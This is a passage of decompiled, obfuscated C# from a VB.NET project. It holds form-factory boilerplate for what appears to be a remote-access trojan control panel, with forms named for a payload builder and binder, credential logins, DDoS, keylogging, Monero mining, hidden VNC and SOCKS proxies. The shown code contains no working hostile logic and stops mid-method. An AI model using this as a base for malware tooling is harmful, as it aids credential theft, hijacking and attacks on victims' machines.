﻿using System;
using System.CodeDom.Compiler;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.ApplicationServices;
using Microsoft.VisualBasic.CompilerServices;

// Token: 0x0200019B RID: 411
[GeneratedCode("MyTemplate", "11.0.0.0")]
[StandardModule]
[HideModuleName]
internal sealed class Class145
{
	// Token: 0x06001695 RID: 5781 RVA: 0x0000B677 File Offset: 0x00009877
	[DebuggerHidden]
	internal static Class129 smethod_0()
	{
		return Class145.class148_0.method_0();
	}

	// Token: 0x06001696 RID: 5782 RVA: 0x0000B683 File Offset: 0x00009883
	[DebuggerHidden]
	internal static Form0 smethod_1()
	{
		return Class145.class148_1.method_0();
	}

	// Token: 0x06001697 RID: 5783 RVA: 0x0000B68F File Offset: 0x0000988F
	[DebuggerHidden]
	internal static User smethod_2()
	{
		return Class145.class148_2.method_0();
	}

	// Token: 0x06001698 RID: 5784 RVA: 0x0000B69B File Offset: 0x0000989B
	[DebuggerHidden]
	internal static Class145.Class146 smethod_3()
	{
		return Class145.class148_3.method_0();
	}

	// Token: 0x06001699 RID: 5785 RVA: 0x0000B6A7 File Offset: 0x000098A7
	[DebuggerHidden]
	internal static Class145.Class147 smethod_4()
	{
		return Class145.class148_4.method_0();
	}

	// Token: 0x0400087C RID: 2172
	private static readonly Class145.Class148<Class129> class148_0 = new Class145.Class148<Class129>();

	// Token: 0x0400087D RID: 2173
	private static readonly Class145.Class148<Form0> class148_1 = new Class145.Class148<Form0>();

	// Token: 0x0400087E RID: 2174
	private static readonly Class145.Class148<User> class148_2 = new Class145.Class148<User>();

	// Token: 0x0400087F RID: 2175
	private static Class145.Class148<Class145.Class146> class148_3 = new Class145.Class148<Class145.Class146>();

	// Token: 0x04000880 RID: 2176
	private static readonly Class145.Class148<Class145.Class147> class148_4 = new Class145.Class148<Class145.Class147>();

	// Token: 0x0200019C RID: 412
	[MyGroupCollection("System.Windows.Forms.Form", "Create__Instance__", "Dispose__Instance__", "My.MyProject.Forms")]
	[EditorBrowsable(EditorBrowsableState.Never)]
	internal sealed class Class146
	{
		// Token: 0x0600169A RID: 5786 RVA: 0x00002B97 File Offset: 0x00000D97
		[EditorBrowsable(EditorBrowsableState.Never)]
		[DebuggerHidden]
		public Class146()
		{
		}

		// Token: 0x0600169B RID: 5787 RVA: 0x000A9BB0 File Offset: 0x000A7DB0
		[DebuggerHidden]
		private static T smethod_0<T>(T gparam_0) where T : Form, new()
		{
			T result;
			if (gparam_0 != null && !gparam_0.IsDisposed)
			{
				result = gparam_0;
			}
			else
			{
				if (Class145.Class146.hashtable_0 != null)
				{
					if (Class145.Class146.hashtable_0.ContainsKey(typeof(T)))
					{
						throw new InvalidOperationException(Utils.GetResourceString("WinForms_RecursiveFormCreate", new string[0]));
					}
				}
				else
				{
					Class145.Class146.hashtable_0 = new Hashtable();
				}
				Class145.Class146.hashtable_0.Add(typeof(T), null);
				try
				{
					result = Activator.CreateInstance<T>();
				}
				catch (TargetInvocationException ex) when (ex.InnerException != null)
				{
					throw new InvalidOperationException(Utils.GetResourceString("WinForms_SeeInnerException", new string[]
					{
						ex.InnerException.Message
					}), ex.InnerException);
				}
				finally
				{
					Class145.Class146.hashtable_0.Remove(typeof(T));
				}
			}
			return result;
		}

		// Token: 0x0600169C RID: 5788 RVA: 0x0000B6B3 File Offset: 0x000098B3
		[DebuggerHidden]
		private void method_0<T>(ref T gparam_0) where T : Form
		{
			gparam_0.Dispose();
			gparam_0 = default(T);
		}

		// Token: 0x0600169D RID: 5789 RVA: 0x0000B6C8 File Offset: 0x000098C8
		[EditorBrowsable(EditorBrowsableState.Never)]
		public override bool Equals(object obj)
		{
			return base.Equals(RuntimeHelpers.GetObjectValue(obj));
		}

		// Token: 0x0600169E RID: 5790 RVA: 0x0000B6D6 File Offset: 0x000098D6
		[EditorBrowsable(EditorBrowsableState.Never)]
		public override int GetHashCode()
		{
			return base.GetHashCode();
		}

		// Token: 0x0600169F RID: 5791 RVA: 0x0000B6DE File Offset: 0x000098DE
		[EditorBrowsable(EditorBrowsableState.Never)]
		internal Type method_1()
		{
			return typeof(Class145.Class146);
		}

		// Token: 0x060016A0 RID: 5792 RVA: 0x0000B6EA File Offset: 0x000098EA
		[EditorBrowsable(EditorBrowsableState.Never)]
		public override string ToString()
		{
			return base.ToString();
		}

		// Token: 0x060016A1 RID: 5793 RVA: 0x0000B6F2 File Offset: 0x000098F2
		public fAbout method_2()
		{
			this.fAbout_0 = Class145.Class146.smethod_0<fAbout>(this.fAbout_0);
			return this.fAbout_0;
		}

		// Token: 0x060016A2 RID: 5794 RVA: 0x0000B70B File Offset: 0x0000990B
		public fBalloontip method_3()
		{
			this.fBalloontip_0 = Class145.Class146.smethod_0<fBalloontip>(this.fBalloontip_0);
			return this.fBalloontip_0;
		}

		// Token: 0x060016A3 RID: 5795 RVA: 0x0000B724 File Offset: 0x00009924
		public fBuilder method_4()
		{
			this.fBuilder_0 = Class145.Class146.smethod_0<fBuilder>(this.fBuilder_0);
			return this.fBuilder_0;
		}

		// Token: 0x060016A4 RID: 5796 RVA: 0x0000B73D File Offset: 0x0000993D
		public fBuilderBinder method_5()
		{
			this.fBuilderBinder_0 = Class145.Class146.smethod_0<fBuilderBinder>(this.fBuilderBinder_0);
			return this.fBuilderBinder_0;
		}

		// Token: 0x060016A5 RID: 5797 RVA: 0x0000B756 File Offset: 0x00009956
		public fBuilderDownloader method_6()
		{
			this.fBuilderDownloader_0 = Class145.Class146.smethod_0<fBuilderDownloader>(this.fBuilderDownloader_0);
			return this.fBuilderDownloader_0;
		}

		// Token: 0x060016A6 RID: 5798 RVA: 0x0000B76F File Offset: 0x0000996F
		public fCertificate method_7()
		{
			this.fCertificate_0 = Class145.Class146.smethod_0<fCertificate>(this.fCertificate_0);
			return this.fCertificate_0;
		}

		// Token: 0x060016A7 RID: 5799 RVA: 0x0000B788 File Offset: 0x00009988
		public fConnectionLog method_8()
		{
			this.fConnectionLog_0 = Class145.Class146.smethod_0<fConnectionLog>(this.fConnectionLog_0);
			return this.fConnectionLog_0;
		}

		// Token: 0x060016A8 RID: 5800 RVA: 0x0000B7A1 File Offset: 0x000099A1
		public fCredentialsLogins method_9()
		{
			this.fCredentialsLogins_0 = Class145.Class146.smethod_0<fCredentialsLogins>(this.fCredentialsLogins_0);
			return this.fCredentialsLogins_0;
		}

		// Token: 0x060016A9 RID: 5801 RVA: 0x0000B7BA File Offset: 0x000099BA
		public fDashboard method_10()
		{
			this.fDashboard_0 = Class145.Class146.smethod_0<fDashboard>(this.fDashboard_0);
			return this.fDashboard_0;
		}

		// Token: 0x060016AA RID: 5802 RVA: 0x0000B7D3 File Offset: 0x000099D3
		public fDDOS method_11()
		{
			this.fDDOS_0 = Class145.Class146.smethod_0<fDDOS>(this.fDDOS_0);
			return this.fDDOS_0;
		}

		// Token: 0x060016AB RID: 5803 RVA: 0x0000B7EC File Offset: 0x000099EC
		public fHWIDUpdate method_12()
		{
			this.fHWIDUpdate_0 = Class145.Class146.smethod_0<fHWIDUpdate>(this.fHWIDUpdate_0);
			return this.fHWIDUpdate_0;
		}

		// Token: 0x060016AC RID: 5804 RVA: 0x0000B805 File Offset: 0x00009A05
		public fKeylogOnline method_13()
		{
			this.fKeylogOnline_0 = Class145.Class146.smethod_0<fKeylogOnline>(this.fKeylogOnline_0);
			return this.fKeylogOnline_0;
		}

		// Token: 0x060016AD RID: 5805 RVA: 0x0000B81E File Offset: 0x00009A1E
		public fMain method_14()
		{
			this.fMain_0 = Class145.Class146.smethod_0<fMain>(this.fMain_0);
			return this.fMain_0;
		}

		// Token: 0x060016AE RID: 5806 RVA: 0x0000B837 File Offset: 0x00009A37
		public fMinerXMR method_15()
		{
			this.fMinerXMR_0 = Class145.Class146.smethod_0<fMinerXMR>(this.fMinerXMR_0);
			return this.fMinerXMR_0;
		}

		// Token: 0x060016AF RID: 5807 RVA: 0x0000B850 File Offset: 0x00009A50
		public fMinerXMRLogManager method_16()
		{
			this.fMinerXMRLogManager_0 = Class145.Class146.smethod_0<fMinerXMRLogManager>(this.fMinerXMRLogManager_0);
			return this.fMinerXMRLogManager_0;
		}

		// Token: 0x060016B0 RID: 5808 RVA: 0x0000B869 File Offset: 0x00009A69
		public fOnJoin method_17()
		{
			this.fOnJoin_0 = Class145.Class146.smethod_0<fOnJoin>(this.fOnJoin_0);
			return this.fOnJoin_0;
		}

		// Token: 0x060016B1 RID: 5809 RVA: 0x0000B882 File Offset: 0x00009A82
		public fPayment method_18()
		{
			this.fPayment_0 = Class145.Class146.smethod_0<fPayment>(this.fPayment_0);
			return this.fPayment_0;
		}

		// Token: 0x060016B2 RID: 5810 RVA: 0x0000B89B File Offset: 0x00009A9B
		public fPaymentDDoS method_19()
		{
			this.fPaymentDDoS_0 = Class145.Class146.smethod_0<fPaymentDDoS>(this.fPaymentDDoS_0);
			return this.fPaymentDDoS_0;
		}

		// Token: 0x060016B3 RID: 5811 RVA: 0x0000B8B4 File Offset: 0x00009AB4
		public fPaymentHVNC method_20()
		{
			this.fPaymentHVNC_0 = Class145.Class146.smethod_0<fPaymentHVNC>(this.fPaymentHVNC_0);
			return this.fPaymentHVNC_0;
		}

		// Token: 0x060016B4 RID: 5812 RVA: 0x0000B8CD File Offset: 0x00009ACD
		public fPreview method_21()
		{
			this.fPreview_0 = Class145.Class146.smethod_0<fPreview>(this.fPreview_0);
			return this.fPreview_0;
		}

		// Token: 0x060016B5 RID: 5813 RVA: 0x0000B8E6 File Offset: 0x00009AE6
		public fRegAdd method_22()
		{
			this.fRegAdd_0 = Class145.Class146.smethod_0<fRegAdd>(this.fRegAdd_0);
			return this.fRegAdd_0;
		}

		// Token: 0x060016B6 RID: 5814 RVA: 0x0000B8FF File Offset: 0x00009AFF
		public fSearch method_23()
		{
			this.fSearch_0 = Class145.Class146.smethod_0<fSearch>(this.fSearch_0);
			return this.fSearch_0;
		}

		// Token: 0x060016B7 RID: 5815 RVA: 0x0000B918 File Offset: 0x00009B18
		public fSettings method_24()
		{
			this.fSettings_0 = Class145.Class146.smethod_0<fSettings>(this.fSettings_0);
			return this.fSettings_0;
		}

		// Token: 0x060016B8 RID: 5816 RVA: 0x0000B931 File Offset: 0x00009B31
		public fSocks4R method_25()
		{
			this.fSocks4R_0 = Class145.Class146.smethod_0<fSocks4R>(this.fSocks4R_0);
			return this.fSocks4R_0;
		}

		// Token: 0x060016B9 RID: 5817 RVA: 0x0000B94A File Offset: 0x00009B4A
		public fSocks5 method_26()
		{
			this.fSocks5_0 = Class145.Class146.smethod_0<fSocks5>(this.fSocks5_0);
			return this.fSocks5_0;
		}

		// Token: 0x060016BA RID: 5818 RVA: 0x0000B963 File Offset: 0x00009B63
		public fSplash method_27()
		{
			this.fSplash_0 = Class145.Class146.smethod_0<fSplash>(this.fSplash_0);
			return this.fSplash_0;
		}

		// Token: 0x060016BB RID: 5819 RVA: 0x0000B97C File Offset: 0x00009B7C
		public fStartup method_28()
		{
			this.fStartup_0 = Class145.Class146.smethod_0<fStartup>(this.fStartup_0);
			return this.fStartup_0;
		}

		// Token: 0x060016BC RID: 5820 RVA: 0x0000B995 File Offset: 0x00009B95
		public fThumb method_29()
		{
			this.fThumb_0 = Class145.Class146.smethod_0<fThumb>(this.fThumb_0);
			return this.fThumb_0;
		}

		// Token: 0x060016BD RID: 5821 RVA: 0x0000B9AE File Offset: 0x00009BAE
		public fTorConfig method_30()
		{
			this.fTorConfig_0 = Class145.Class146.smethod_0<fTorConfig>(this.fTorConfig_0);
			return this.fTorConfig_0;
		}

		// Token: 0x060016BE RID: 5822 RVA: 0x0000B9C7 File Offset: 0x00009BC7
		public fTransferManager method_31()
		{
			this.fTransferManager_0 = Class145.Class146.smethod_0<fTransferManager>(this.fTransferManager_0);
			return this.fTransferManager_0;
		}

		// Token: 0x060016BF RID: 5823 RVA: 0x0000B9E0 File Offset: 0x00009BE0
		public fUpdate method_32()
		{
			this.fUpdate_0 = Class145.Class146.smethod_0<fUpdate>(this.fUpdate_0);
			return this.fUpdate_0;
		}

		// Token: 0x060016C0 RID: 5824 RVA: 0x0000B9F9 File Offset: 0x00009BF9
		public void method_33(fAbout fAbout_1)
		{
			if (fAbout_1 != this.fAbout_0)
			{
				if (fAbout_1 != null)
				{
					throw new ArgumentException("Property can only be set to Nothing");
				}
				this.method_0<fAbout>(ref this.fAbout_0);
			}
		}

		// Token: 0x060016C1 RID: 5825 RVA: 0x0000BA1E File Offset: 0x00009C1E
		public void method_34(fBalloontip fBalloontip_1)
		{
			if (fBalloontip_1 != this.fBalloontip_0)
			{
				if (fBalloontip_1 != null)
				{
					throw new ArgumentException("Property can only be set to Nothing");
				}
				this.method_0<fBalloontip>(ref this.fBalloontip_0);
			}
		}

		// Token: 0x060016C2 RID: 5826 RVA: 0x0000BA43 File Offset: 0x00009C43
		public void method_35(fBuilder fBuilder_1)
		{
			if (fBuilder_1 != this.fBuilder_0)
			{
				if (fBuilder_1 != null)
				{
					throw new ArgumentException("Property can only be set to Nothing");
				}
				this.method_0<fBuilder>(ref this.fBuilder_0);
			}
		}

		// Token: 0x060016C3 RID: 5827 RVA: 0x0000BA68 File Offset: 0x00009C68
		public void method_36(fBuilderBinder fBuilderBinder_1)
		{
			if (fBuilderBinder_1 != this.fBuilderBinder_0)
			{
				if (fBuilderBinder_1 != null)
				{
					throw new ArgumentException("Property can only be set to Nothing");
				}
				this.method_0<fBuilderBinder>(ref this.fBuilderBinder_0);
			}
		}

		// Token: 0x060016C4 RID: 5828 RVA: 0x0000BA8D File Offset: 0x00009C8D
		public void method_37(fBuilderDownloader fBuilderDownloader_1)
		{
			if (fBuilderDownloader_1 != this.fBuilderDownloader_0)
			{
				if (fBuilderDownloader_1 != null)
				{
					throw new ArgumentException("Property can only be set to Nothing");
				}
				this.method_0<fBuilderDownloader>(ref this.fBuilderDownloader_0);
			}
		}

		// Token: 0x060016C5 RID: 5829 RVA: 0x0000BAB2 File Offset: 0x00009CB2
		public void method_38(fCertificate fCertificate_1)
		{
			if (fCertificate_1 != this.fCertificate_0)
			{
				if (fCertificate_1 != null)
				{
					throw new ArgumentException("Property can only be set to Nothing");
				}
				this.method_0<fCertificate>(ref this.fCertificate_0);
			}
		}

		// Token: 0x060016C6 RID: 5830 RVA: 0x0000BAD7 File Offset: 0x00009CD7
		public void method_39(fConnectionLog fConnectionLog_1)
		{
			if (fConnectionLog_1 != this.fConnectionLog_0)
			{
				if (fConnectionLog_1 != null)
				{
					throw new ArgumentException("Property can only be set to Nothing");
				}
				this.method_0<fConnectionLog>(ref this.fConnectionLog_0);
			}
		}

		// Token: 0x060016C7 RID: 5831 RVA: 0x0000BAFC File Offset: 0x00009CFC
		public void method_40(fCredentialsLogins fCredentialsLogins_1)
		{
			if (fCredentialsLogins_1 != this.fCredentialsLogins_0)
			{
				if (fCredentialsLogins_1 != null)
				{
					throw new ArgumentException("Property can only be set to Nothing");
				}
				this.method_0<fCredentialsLogins>(ref this.fCredentialsLogins_0);
			}
		}

		// Token: 0x060016C8 RID: 5832 RVA: 0x0000BB21 File Offset: 0x00009D21
		public void method_41(fDashboard fDashboard_1)
		{
			if (fDashboard_1 != this.fDashboard_0)
			{
				if (fDashboard_1 != null)
				{
					throw new ArgumentException("Property can only be set to Nothing");
				}
				this.method_0<fDashboard>(ref this.fDashboard_0);
			}
		}

		// Token: 0x060016C9 RID: 5833 RVA: 0x0000BB46 File Offset: 0x00009D46
		public void method_42(fDDOS fDDOS_1)
		{
			if (fDDOS_1 != this.fDDOS_0)
			{
				if (fDDOS_1 != null)
				{
					throw new ArgumentException("Property can only be set to Nothing");
				}
				this.method_0<fDDOS>(ref this.fDDOS_0);
			}
		}

		// Token: 0x060016CA RID: 5834 RVA: 0x0000BB6B File Offset: 0x00009D6B
		public void method_43(fHWIDUpdate fHWIDUpdate_1)
		{
			if (fHWIDUpdate_1 != this.fHWIDUpdate_0)
			{
				if (fHWIDUpdate_1 != null)
				{
					throw new ArgumentException("Property can only be set to Nothing");
				}
				this.method_0<fHWIDUpdate>(ref this.fHWIDUpdate_0);
			}
		}

		// Token: 0x060016CB RID: 5835 RVA: 0x0000BB90 File Offset: 0x00009D90
		public void method_44(fKeylogOnline fKeylogOnline_1)
		{
			if (fKeylogOnline_1 != this.fKeylogOnline_0)
			{
				if (fKeylogOnline_1 != null)
				{
					throw new ArgumentException("Property can only be set to Nothing");
				}
				this.method_0<fKeylogOnline>(ref this.fKeylogOnline_0);
			}
		}

		// Token: 0x060016CC RID: 5836 RVA: 0x0000BBB5 File Offset: 0x00009DB5
		public void method_45(fMain fMain_1)
		{
			if (fMain_1 != this.fMain_0)
			{
				if (fMain_1 != null)
				{
					throw new ArgumentException("Property can only be set to Nothing");
				}
				this.method_0<fMain>(ref this.fMain_0);
			}
		}

		// Token: 0x060016CD RID: 5837 RVA: 0x0000BBDA File Offset: 0x00009DDA
		public void method_46(fMinerXMR fMinerXMR_1)
		{
			if (fMinerXMR_1 != this.fMinerXMR_0)
			{
				if (fMinerXMR_1 != null)
				{
					throw new ArgumentException("Property can only be set to Nothing");
				}
				this.method_0<fMinerXMR>(ref this.fMinerXMR_0);
			}
		}

		// Token: 0x060016CE RID: 5838 RVA: 0x0000BBFF File Offset: 0x00009DFF
		public void method_47(fMinerXMRLogManager fMinerXMRLogManager_1)
		{
			if (fMinerXMRLogManager_1 != this.fMinerXMRLogManager_0)
			{
				if (fMinerXMRLogManager_1 != null)
				{
					throw new ArgumentException("Property can only be set to Nothing");
				}
				this.method_0<fMinerXMRLogManager>(ref this.fMinerXMRLogManager_0);
			}
		}

		// Token: 0x060016CF RID: 5839 RVA: 0x0000BC24 File Offset: 0x00009E24
		public void method_48(fOnJoin fOnJoin_1)
		{
			if (fOnJoin_1 != this.fOnJoin_0)
			{
				if (fOnJoin_1 != null)
				{
					throw new ArgumentException("Property can only be set to Nothing");
				}
				this.method_0<fOnJoin>(ref this.fOnJoin_0);
			}
		}

		// Token: 0x060016D0 RID: 5840 RVA: 0x0000BC49 File Offset: 0x00009E49
		public void method_49(fPayment fPayment_1)
		{
			if (fPayment_1 != this.fPayment_0)
			{
				if (fPayment_1 != null)
				{
					throw new ArgumentException("Property can only be set to Nothing");
				}
				this.method_0<fPayment>(ref this.fPayment_0);
			}
		}

		// Token: 0x060016D1 RID: 5841 RVA: 0x0000BC6E File Offset: 0x00009E6E
		public void method_50(fPaymentDDoS fPaymentDDoS_1)
		{
			if (fPaymentDDoS_1 != this.fPaymentDDoS_0)
			{
				if (fPaymentDDoS_1 != null)
				{
					throw new ArgumentException("Property can only be set to Nothing");
				}
				this.method_0<fPaymentDDoS>(ref this.fPaymentDDoS_0);
			}
		}

		// Token: 0x060016D2 RID: 5842 RVA: 0x0000BC93 File Offset: 0x00009E93
		public void method_51(fPaymentHVNC fPaymentHVNC_1)
		{
			if (fPaymentHVNC_1 != this.fPaymentHVNC_0)
			{
				if (fPaymentHVNC_1 != null)
				{
					throw new ArgumentException("Property can only be set to Nothing");
				}
				this.method_0<fPaymentHVNC>(ref this.fPaymentHVNC_0);
			}
		}

		// Token: 0x060016D3 RID: 5843 RVA: 0x0000BCB8 File Offset: 0x00009EB8
		public void method_52(fPreview fPreview_1)
		{
			if (fPreview_1 != this.fPreview_0)
			{
				if (fPreview_1 != null)
				{
					throw new ArgumentException("Property can only be set to Nothing");
				}
				this.method_0<fPreview>(ref this.fPreview_0);
			}
		}

		// Token: 0x060016D4 RID: 5844 RVA: 0x0000BCDD File Offset: 0x00009EDD
		public void method_53(fRegAdd fRegAdd_1)
		{
			if (fRegAdd_1 != this.fRegAdd_0)
			{
				if (fRegAdd_1 != null)
				{
					throw new ArgumentException("Property can only be set to Nothing");
				}
				this.method_0<fRegAdd>(ref this.fRegAdd_0);
			}
		}

		// Token: 0x060016D5 RID: 5845 RVA: 0x0000BD02 File Offset: 0x00009F02
		public void method_54(fSearch fSearch_1)
		{
			if (fSearch_1 != this.fSearch_0)
			{
				if (fSearch_1 != null)
				{
					throw new ArgumentException("Property can only be set to Nothing");
				}
				this.method_0<fSearch>(ref this.fSearch_0);
			}
		}

		// Token: 0x060016D6 RID: 5846 RVA: 0x0000BD27 File Offset: 0x00009F27
		public void method_55(fSettings fSettings_1)
		{
			if (fSettings_1 != this.fSettings_0)
			{
				if (fSettings_1 != null)
				{
					throw new ArgumentException("Property can only be set to Nothing");
				}
				this.method_0<fSettings>(ref this.fSettings_0);
			}
		}

		// Token: 0x060016D7 RID: 5847 RVA: 0x0000BD4C File Offset: 0x00009F4C
		public void method_56(fSocks4R fSocks4R_1)
		{
			if (fSocks4R_1 != this.fSocks4R_0)
			{
				if (fSocks4R_1 != null)
				{
					throw new ArgumentException("Property can only be set to Nothing");
				}
				this.method_0<fSocks4R>(ref this.fSocks4R_0);
			}
		}

		// Token: 0x060016D8 RID: 5848 RVA: 0x0000BD71 File Offset: 0x00009F71
		public void method_57(fSocks5 fSocks5_1)
		{
			if (fSocks5_1 != this.fSocks5_0)
			{
				if (fSocks5_1 != null)
				{
					throw new ArgumentException("Property can only be set to Nothing");
				}
				this.method_0<fSocks5>(ref this.fSocks5_0);
			}
		}

		// Token: 0x060016D9 RID: 5849 RVA: 0x0000BD96 File Offset: 0x00009F96
		public void method_58(fSplash fSplash_1)
		{
			if (fSplash_1 != this.fSplash_0)
			{
				if (fSplash_1 != null)
				{
					throw new ArgumentException("Property can only be set to Nothing");
				}
				this.method_0<fSplash>(ref this.fSplash_0);
			}
		}

		// Token: 0x060016DA RID: 5850 RVA: 0x0000BDBB File Offset: 0x00009FBB
		public void method_59(fStartup fStartup_1)
		{
			if (fStartup_1 != this.fStartup_0)
			{
				if (fStartup_1 != null)
				{
					throw new ArgumentException("Property can only be set to Nothing");
				}
				this.method_0<fStartup>(ref this.fStartup_0);
			}
		}

		// Token: 0x060016DB RID: 5851 RVA: 0x0000BDE0 File Offset: 0x00009FE0
		public void method_60(fThumb fThumb_1)
		{
			if (fThumb_1 != this.fThumb_0)
			{
				if (fThumb_1 != null)
				{
					throw new ArgumentException("Property can only be set to Nothing");
				}
				this.method_0<fThumb>(ref this.fThumb_0);
			}
		}

		// Token: 0x060016DC RID: 5852 RVA: 0x0000BE05 File Offset: 0x0000A005
		public void method_61(fTorConfig fTorConfig_1)
		{
			if (fTorConfig_1 != this.fTorConfig_0)
			{
				if (fTorConfig_1 != null)
				{
					throw new ArgumentException("Property can only be set to Nothing");
				}
				this.method_0<fTorConfig>(ref this.fTorConfig_0);
			}
		}

		// Token: 0x060016DD RID: 5853 RVA: 0x0000BE2A File Offset: 0x0000A02A
		public void method_62(fTransferManager fTransferManager_1)
		{
			if (fTransferManager_1 != this.fTransferManager_0)
			{
				if (fTransferManager_1 != null)
				{
					throw new ArgumentException("Property can only be set to Nothing");
				}
				this.method_0<fTransferManager>(ref this.fTransferManager_0);
			}
		}

		// Token: 0x060016DE RID: 5854 RVA: 0x0000BE4F File Offset: 0x0000A04F
		public void method_63(fUpdate fUpdate_1)
		{
			if (fUpdate_1 != this.fUpdate_0)
			{
				if (fUpdate_1 != null)
				{
					throw new ArgumentException("Property can only be set to Nothing");
				}
				this.method_0<fUpdate>(ref this.fUpdate_0);
			}
		}

		// Token: 0x04000881 RID: 2177
		[ThreadStatic]
		private static Hashtable hashtable_0;

		// Token: 0x04000882 RID: 2178
		[EditorBrowsable(EditorBrowsableState.Never)]
		public fAbout fAbout_0;

		// Token: 0x04000883 RID: 2179
		[EditorBrowsable(EditorBrowsableState.Never)]
		public fBalloontip fBalloontip_0;

		// Token: 0x04000884 RID: 2180
		[EditorBrowsable(EditorBrowsableState.Never)]
		public fBuilder fBuilder_0;

		// Token: 0x04000885 RID: 2181
		[EditorBrowsable(EditorBrowsableState.Never)]
		public fBuilderBinder fBuilderBinder_0;

		// Token: 0x04000886 RID: 2182
		[EditorBrowsable(EditorBrowsableState.Never)]
		public fBuilderDownloader fBuilderDownloader_0;

		// Token: 0x04000887 RID: 2183
		[EditorBrowsable(EditorBrowsableState.Never)]
		public fCertificate fCertificate_0;

		// Token: 0x04000888 RID: 2184
		[EditorBrowsable(EditorBrowsableState.Never)]
		public fConnectionLog fConnectionLog_0;

		// Token: 0x04000889 RID: 2185
		[EditorBrowsable(EditorBrowsableState.Never)]
		public fCredentialsLogins fCredentialsLogins_0;

		// Token: 0x0400088A RID: 2186
		[EditorBrowsable(EditorBrowsableState.Never)]
		public fDashboard fDashboard_0;

		// Token: 0x0400088B RID: 2187
		[EditorBrowsable(EditorBrowsableState.Never)]
		public fDDOS fDDOS_0;

		// Token: 0x0400088C RID: 2188
		[EditorBrowsable(EditorBrowsableState.Never)]
		public fHWIDUpdate fHWIDUpdate_0;

		// Token: 0x0400088D RID: 2189
		[EditorBrowsable(EditorBrowsableState.Never)]
		public fKeylogOnline fKeylogOnline_0;

		// Token: 0x0400088E RID: 2190
		[EditorBrowsable(EditorBrowsableState.Never)]
		public fMain fMain_0;

		// Token: 0x0400088F RID: 2191
		[EditorBrowsable(EditorBrowsableState.Never)]
		public fMinerXMR fMinerXMR_0;

		// Token: 0x04000890 RID: 2192
		[EditorBrowsable(EditorBrowsableState.Never)]
		public fMinerXMRLogManager fMinerXMRLogManager_0;

		// Token: 0x04000891 RID: 2193
		[EditorBrowsable(EditorBrowsableState.Never)]
		public fOnJoin fOnJoin_0;

		// Token: 0x04000892 RID: 2194
		[EditorBrowsable(EditorBrowsableState.Never)]
		public fPayment fPayment_0;

		// Token: 0x04000893 RID: 2195
		[EditorBrowsable(EditorBrowsableState.Never)]
		public fPaymentDDoS fPaymentDDoS_0;

		// Token: 0x04000894 RID: 2196
		[EditorBrowsable(EditorBrowsableState.Never)]
		public fPaymentHVNC fPaymentHVNC_0;

		// Token: 0x04000895 RID: 2197
		[EditorBrowsable(EditorBrowsableState.Never)]
		public fPreview fPreview_0;

		// Token: 0x04000896 RID: 2198
		[EditorBrowsable(EditorBrowsableState.Never)]
		public fRegAdd fRegAdd_0;

		// Token: 0x04000897 RID: 2199
		[EditorBrowsable(EditorBrowsableState.Never)]
		public fSearch fSearch_0;

		// Token: 0x04000898 RID: 2200
		[EditorBrowsable(EditorBrowsableState.Never)]
		public fSettings fSettings_0;

		// Token: 0x04000899 RID: 2201
		[EditorBrowsable(EditorBrowsableState.Never)]
		public fSocks4R fSocks4R_0;

		// Token: 0x0400089A RID: 2202
		[EditorBrowsable(EditorBrowsableState.Never)]
		public fSocks5 fSocks5_0;

		// Token: 0x0400089B RID: 2203
		[EditorBrowsable(EditorBrowsableState.Never)]
		public fSplash fSplash_0;

		// Token: 0x0400089C RID: 2204
		[EditorBrowsable(EditorBrowsableState.Never)]
		public fStartup fStartup_0;

		// Token: 0x0400089D RID: 2205
		[EditorBrowsable(EditorBrowsableState.Never)]
		public fThumb fThumb_0;

		// Token: 0x0400089E RID: 2206
		[EditorBrowsable(EditorBrowsableState.Never)]
		public fTorConfig fTorConfig_0;

		// Token: 0x0400089F RID: 2207
		[EditorBrowsable(EditorBrowsableState.Never)]
		public fTransferManager fTransferManager_0;

		// Token: 0x040008A0 RID: 2208
		[EditorBrowsable(EditorBrowsableState.Never)]
		public fUpdate fUpdate_0;
	}

	// Token: 0x0200019D RID: 413
	[MyGroupCollection("System.Web.Services.Protocols.SoapHttpClientProtocol", "Create__Instance__", "Dispose__Instance__", "")]
	[EditorBrowsable(EditorBrowsableState.Never)]
	internal sealed class Class147
	{
		// Token: 0x060016DF RID: 5855 RVA: 0x00002B97 File Offset: 0x00000D97
		[DebuggerHidden]
		[EditorBrowsable(EditorBrowsableState.Never)]
		public Class147()
		{
		}

		// Token: 0x060016E0 RID: 5856 RVA: 0x0000B6C8 File Offset: 0x000098C8
		[DebuggerHidden]
		[EditorBrowsable(EditorBrowsableState.Never)]
		public override bool Equals(object obj)
		{
			return base.Equals(RuntimeHelpers.GetObjectValue(obj));
		}

		// Token: 0x060016E1 RID: 5857 RVA: 0x0000B6D6 File Offset: 0x000098D6
		[DebuggerHidden]
		[EditorBrowsable(EditorBrowsableState.Never)]
		public override int GetHashCode()
		{
			return base.GetHashCode();
		}

		// Token: 0x060016E2 RID: 5858 RVA: 0x0000BE74 File Offset: 0x0000A074
		[DebuggerHidden]
		[EditorBrowsable(EditorBrowsableState.Never)]
		internal Type method_0()
		{
			return typeof(Class145.Class147);
		}

		// Token: 0x060016E3 RID: 5859 RVA: 0x0000B6EA File Offset: 0x000098EA
		[EditorBrowsable(EditorBrowsableState.Never)]
		[DebuggerHidden]
		public override string ToString()
		{
			return base.ToString();
		}

		// Token: 0x060016E4 RID: 5860 RVA: 0x000A9CB4 File Offset: 0x000A7EB4
		[DebuggerHidden]
		private static T smethod_0<T>(T gparam_0) where T : new()
		{
			T result;
			if (gparam_0 == null)
			{
				result = Activator.CreateInstance<T>();
			}
			else
			{
				result = gparam_0;
			}
			return result;
		}

		// Token: 0x060016E5 RID: 5861 RVA: 0x0000BE80 File Offset: 0x0000A080
		[DebuggerHidden]
		private void method_1<T>(ref T gparam_0)
		{
			gparam_0 = default(T);
		}
	}

	// Token: 0x0200019E RID: 414
	[EditorBrowsable(EditorBrowsableState.Never)]
	[ComVisible(false)]
	internal sealed class Class148<T> where T : new()
	{
		// Token: 0x060016E6 RID: 5862 RVA: 0x00002B97 File Offset: 0x00000D97
		[DebuggerHidden]
		[EditorBrowsable(EditorBrowsableState.Never)]
		public Class148()
		{
		}

		// Token: 0x060016E7 RID: 5863 RVA: 0x0000BE89 File Offset: 0x0000A089
		[DebuggerHidden]
		internal T method_0()
		{
